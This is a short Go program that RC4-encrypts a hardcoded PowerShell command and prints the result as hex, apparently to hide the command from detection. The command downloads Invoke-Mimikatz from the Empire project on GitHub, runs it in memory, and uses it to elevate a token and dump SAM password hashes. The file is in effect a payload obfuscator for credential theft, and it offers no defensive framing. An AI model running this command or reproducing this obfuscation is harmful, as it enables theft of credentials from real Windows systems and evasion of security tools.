package main

import (
	"crypto/rc4"
	"encoding/hex"
	"fmt"
)

func main() {
	// Key for RC4 encryption
	key := []byte("supersecretkey")

	// Message to be encoded
	message := `IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'`

	// Create RC4 cipher
	cipher, err := rc4.NewCipher(key)
	if err != nil {
		fmt.Println("Error creating cipher:", err)
		return
	}

	// Convert message to bytes
	messageBytes := []byte(message)

	// Encrypt message
	encrypted := make([]byte, len(messageBytes))
	cipher.XORKeyStream(encrypted, messageBytes)

	// Output the encrypted message as hex
	fmt.Println("RC4 Encrypted (Hex):", hex.EncodeToString(encrypted))
}
